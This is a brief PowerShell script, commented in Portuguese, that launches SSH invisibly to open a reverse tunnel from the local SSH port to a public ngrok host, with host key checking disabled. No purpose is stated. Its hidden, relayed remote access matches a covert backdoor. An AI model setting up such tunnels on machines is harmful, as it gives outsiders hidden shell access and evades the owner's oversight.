# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\Admin\.ssh\ssh_key"

# Argumentos da conexão SSH
$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 3333:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 15982 -N -vvv"

# Executa o SSH de forma invisível
Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
